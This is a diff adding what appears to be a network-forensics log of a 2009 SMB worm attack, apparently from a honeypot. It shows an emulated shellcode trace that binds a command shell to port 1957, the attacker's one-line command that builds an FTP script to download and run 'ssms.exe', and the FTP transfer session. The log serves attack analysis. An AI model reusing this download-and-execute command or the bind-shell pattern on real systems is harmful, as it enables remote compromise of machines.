@@ -1,0 +1,172 @@
+Processing
+(('98.114.205.102', 1821), ('192.150.11.111', 445)) Start 1970-01-01 00:00:00 Stop 1970-01-01 00:00:00 Duration NaN C2S 0 (application/x-empty) S2C 0 (application/x-empty)
+(('98.114.205.102', 1828), ('192.150.11.111', 445)) Start 2009-04-20 03:28:28.642319 Stop 2009-04-20 03:28:30.509185 Duration 1.86686611176 C2S 4209 (application/octet-stream) S2C 902 (application/octet-stream)
+application/octet-stream -> data -> /tmp/filep1f00v
+[+] Shellcode found
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e92a8 => 
+         none;
+     LPCSTR = 0x094e9308 => 
+           = "CreateProcessA";
+) =  0x7c802367;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9450 => 
+         none;
+     LPCSTR = 0x094e94b0 => 
+           = "ExitThread";
+) =  0x7c80c058;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9600 => 
+         none;
+     LPCSTR = 0x094e9660 => 
+           = "LoadLibraryA";
+) =  0x7c801d77;
+HMODULE LoadLibraryA (
+     LPCTSTR = 0x094e97a8 => 
+           = "ws2_32";
+) =  0x71a10000;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e98e8 => 
+         none;
+     LPCSTR = 0x094e9948 => 
+           = "WSASocketA";
+) =  0x71a18769;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9a90 => 
+         none;
+     LPCSTR = 0x094e9af0 => 
+           = "bind";
+) =  0x71a13e00;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9c38 => 
+         none;
+     LPCSTR = 0x094e9c98 => 
+           = "listen";
+) =  0x71a188d3;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9de0 => 
+         none;
+     LPCSTR = 0x094e9e40 => 
+           = "accept";
+) =  0x71a21028;
+FARPROC WINAPI GetProcAddress (
+     HMODULE = 0x094e9f88 => 
+         none;
+     LPCSTR = 0x094e9fe8 => 
+           = "closesocket";
+) =  0x71a19639;
+SOCKET WSASocket (
+     int af = 2;
+     int type = 1;
+     int protocol = 0;
+     LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
+     GROUP g = 0;
+     DWORD dwFlags = 0;
+) =  0x42;
+int bind (
+     SOCKET s = 66;
+     struct sockaddr_in * name = 0x004175e2 => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 42247 (port=1957);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 0 (host=0.0.0.0);
+             };
+             char sin_zero = "       ";
+         };
+     int namelen = 16;
+) =  0x0;
+int listen (
+     SOCKET s = 66;
+     int backlog = 1;
+) =  0x0;
+SOCKET accept (
+     SOCKET s = 66;
+     struct sockaddr * addr = 0x00000000 => 
+         struct   = {
+         };
+     int = 0x094ea800 => 
+         none;
+) =  0x44;
+BOOL CreateProcess (
+     LPCWSTR = 0x094ea9b0 => 
+           = "g";
+     LPCWSTR = 0x094eaa48 => 
+           = "cmd";
+     LPSECURITY_ATTRIBUTES = 0x094eaad8 => 
+         none;
+     LPSECURITY_ATTRIBUTES = 0x094eab48 => 
+         none;
+     BOOL fInheritHandles = 1;
+     DWORD fdwCreate = 0;
+     LPVOID = 0x094eac40 => 
+         none;
+     LPWSTR = 0x094eaca8 => 
+         none;
+     struct LPSTARTUPINFOW psiStartInfo = 0x0012fe54 => 
+         struct   = {
+             DWORD cb = 0;
+             LPTSTR lpReserved = 0;
+             LPTSTR lpDesktop = 0;
+             LPTSTR lpTitle = 0;
+             DWORD dwX = 0;
+             DWORD dwY = 0;
+             DWORD dwXSize = 0;
+             DWORD dwYSize = 0;
+             DWORD dwXCountChars = 0;
+             DWORD dwYCountChars = 0;
+             DWORD dwFillAttribute = 0;
+             DWORD dwFlags = 0;
+             WORD wShowWindow = 0;
+             WORD cbReserved2 = 0;
+             LPBYTE lpReserved2 = 0;
+             HANDLE hStdInput = 68;
+             HANDLE hStdOutput = 68;
+             HANDLE hStdError = 68;
+         };
+     struct PROCESS_INFORMATION pProcInfo = 0x0052f74c => 
+         struct   = {
+             HANDLE hProcess = 4711;
+             HANDLE hThread = 4712;
+             DWORD dwProcessId = 4712;
+             DWORD dwThreadId = 4714;
+         };
+) =  0xffffffff;
+int closesocket (
+     SOCKET s = 68;
+) =  0x0;
+int closesocket (
+     SOCKET s = 66;
+) =  0x0;
+void ExitThread (
+     DWORD dwExitCode = 0;
+) =  0x0;
+
+application/octet-stream -> data -> /tmp/fileyOPxby
+(('98.114.205.102', 1924), ('192.150.11.111', 1957)) Start 2009-04-20 03:28:31.701948 Stop 2009-04-20 03:28:33.317950 Duration 1.61600208282 C2S 133 (text/plain) S2C 2 (text/plain)
+##### INTERLEAVED #####
+
+echo open 0.0.0.0 8884 > o&echo user 1 1 >> o &echo get ssms.exe >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &ssms.exe
+
+ssms.exe
+
+
+(('98.114.205.102', 2152), ('192.150.11.111', 1080)) Start 2009-04-20 03:28:34.648099 Stop 2009-04-20 03:28:44.415405 Duration 9.7673060894 C2S 158720 (application/x-dosexec) S2C 0 (application/x-empty)
+(('192.150.11.111', 36296), ('98.114.205.102', 8884)) Start 2009-04-20 03:28:33.723988 Stop 2009-04-20 03:28:44.591557 Duration 10.8675689697 C2S 77 (text/plain) S2C 214 (text/plain)
+##### INTERLEAVED #####
+220 NzmxFtpd 0wns j0
+USER 1
+331 Password required
+PASS 1
+230 User logged in.
+SYST
+215 NzmxFtpd
+TYPE I
+200 Type set to I.
+PORT 192,150,11,111,4,56
+200 PORT command successful.
+RETR ssms.exe
+150 Opening BINARY mode data connection
+QUIT
+226 Transfer complete.
+
